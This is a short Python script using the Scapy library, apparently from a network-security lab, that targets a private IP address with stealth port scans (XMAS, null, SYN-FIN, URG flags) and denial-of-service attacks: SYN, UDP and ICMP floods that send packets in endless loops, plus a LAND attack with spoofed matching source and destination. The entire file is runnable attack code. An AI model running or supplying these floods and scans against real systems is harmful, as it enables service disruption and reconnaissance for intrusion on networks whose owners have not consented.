#https://www.uv.mx/personal/angelperez/files/2018/10/scanning_texto.pdf
from scapy.all import *

ip = "192.168.210.162"

common_ports = {80, 21, 22, 23, 25, 53, 443}

def parser():
	if (len(sys.argv) != 2):
		print('Possible options: \n\tRecon:\txmas / no-flags / syn-fin\
/ urg \n\tDoS:\tudp-flood / syn-flood / icmp-flood / land')
		return

	attack = sys.argv[1]
	
	# Recon attacks:
	if attack == 'xmas':
		xmas_recon();
	elif attack == 'no-flags':
		no_flags_recon();
	elif attack == 'syn-fin':
		syn_fin_recon();
	elif attack == 'urg':
		urg_recon();
	
	# DoS attacks:
	elif attack == 'udp-flood':
		udp_flood_attack();
	elif attack == 'syn-flood':
		syn_flood_attack();
	elif attack == 'icmp-flood':
		icmp_flood_attack();
	elif attack == 'land':
		land_attack();

# Recon attacks:
def recon(flags_set):
	for dst_port in common_ports:
		src_port = RandShort()	# Src port is generated randomly
		p = IP(dst=ip)/TCP(sport=src_port, dport=dst_port, flags=flags_set)
		resp = sr1(p,timeout=1) # Sending packet

		# No response => port is open
		if str(type(resp))=="<type 'NoneType'>":
			print('---> Port ' + str(dst_port) + ' is OPEN / FILTERED.\n')
		elif resp.haslayer(TCP):
			if resp.getlayer(TCP).flags == 0x14:
				print('---> Port ' + str(dst_port) + ' is CLOSED.\n')

def xmas_recon():
	recon('FPU')

def syn_fin_recon():
	recon('SF')

def no_flags_recon():
	recon('')

def urg_recon():
	recon('U')


# DoS attacks:
def syn_flood_attack():
	packet = IP(dst=ip) / TCP(dport=5001, flags="S")
	send(packet, loop=1, inter=0.005)

def udp_flood_attack():
	packet = IP(dst=ip) / UDP(dport=80) / ("X" * RandByte()) 
	send(packet, loop=1, inter=0.001)

def icmp_flood_attack():
	packet = IP(dst=ip) / ICMP() / "1234567890"
	send(packet, loop=1, inter=0.005) 

def land_attack():
	packet = IP(dst=ip, src=ip) / TCP(sport=80, dport=80, flags="S")
	send(packet) 

parser();
